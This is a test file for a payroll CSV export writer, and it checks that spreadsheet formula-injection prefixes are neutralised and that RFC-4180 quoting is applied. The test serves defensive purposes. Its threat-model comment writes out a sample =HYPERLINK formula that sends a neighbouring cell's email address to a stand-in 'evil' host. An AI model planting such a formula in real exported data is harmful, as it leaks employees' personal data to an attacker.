// Copyright 2026 Kisaes LLC
// Licensed under the PolyForm Internal Use License 1.0.0.
// You may not distribute this software. See LICENSE for terms.
/**
 * Locks in CSV-injection neutralization for payroll exports + the basic
 * RFC-4180 quoting that runs alongside it. Cells whose first character
 * is `= + - @ \t \r` would otherwise be treated as formulas when the
 * downloaded CSV is opened in Excel / Numbers / LibreOffice. Prefixing
 * with a single quote turns them into literal text.
 *
 * Threat model: a malicious employee sets their first name to
 * `=HYPERLINK("http://evil/?x="&A1,…)`. CPA admin downloads the
 * payroll-relief CSV and double-clicks it. Excel evaluates the
 * formula and exfiltrates the next-row email cell on hover. The
 * single-quote prefix breaks that chain.
 */
import { describe, expect, it } from 'vitest';
import { csvLine, formatCell } from '../csv.js';

describe('payroll-exports CSV writer', () => {
  describe('formula injection neutralization', () => {
    it('prefixes a single quote on cells starting with =', () => {
      expect(formatCell('=HYPERLINK("http://x")')).toBe('"\'=HYPERLINK(""http://x"")"');
    });

    it('prefixes a single quote on cells starting with +', () => {
      expect(formatCell('+1234')).toBe("'+1234");
    });

    it('prefixes a single quote on cells starting with -', () => {
      expect(formatCell('-5')).toBe("'-5");
    });

    it('prefixes a single quote on cells starting with @', () => {
      expect(formatCell('@SUM(A1:A5)')).toBe("'@SUM(A1:A5)");
    });

    it('prefixes a single quote on cells starting with tab', () => {
      expect(formatCell('\tnasty')).toBe("'\tnasty");
    });

    it('leaves a normal cell unchanged', () => {
      expect(formatCell('Smith')).toBe('Smith');
    });

    it('leaves an empty cell unchanged', () => {
      expect(formatCell('')).toBe('');
      expect(formatCell(null)).toBe('');
      expect(formatCell(undefined)).toBe('');
    });

    it('handles a numeric cell as plain stringification (no formula prefix on a positive number)', () => {
      expect(formatCell(42)).toBe('42');
      expect(formatCell(0)).toBe('0');
    });

    it('still prefixes when a number serializes negative', () => {
      // A negative number would naturally start with `-` and get a
      // literal-text prefix. Acceptable trade-off vs. CSV-borne RCE
      // — no payroll-export field today emits negatives, and the
      // cosmetic glitch is preferable to leaving a formula vector
      // open.
      expect(formatCell(-7)).toBe("'-7");
    });
  });

  describe('RFC-4180 quoting (composes with the formula prefix)', () => {
    it('wraps a cell with a comma in double quotes', () => {
      expect(formatCell('Smith, Jr.')).toBe('"Smith, Jr."');
    });

    it('wraps a cell with a CRLF in double quotes', () => {
      expect(formatCell('line1\r\nline2')).toBe('"line1\r\nline2"');
    });

    it('escapes embedded double quotes by doubling', () => {
      expect(formatCell('say "hi"')).toBe('"say ""hi"""');
    });

    it('a formula-prefix + comma cell wraps the prefix inside the quote pair', () => {
      // The leading single-quote must be inside the wrapping
      // double-quote pair so the cell is parsed as a single field.
      expect(formatCell('=Hello, World')).toBe('"\'=Hello, World"');
    });
  });

  describe('csvLine', () => {
    it('joins cells with commas and terminates with CRLF per RFC 4180', () => {
      expect(csvLine(['a', 'b', 'c'])).toBe('a,b,c\r\n');
    });

    it('applies formula neutralization across all cells', () => {
      expect(csvLine(['safe', '=DANGER', '+also'])).toBe("safe,'=DANGER,'+also\r\n");
    });
  });
});
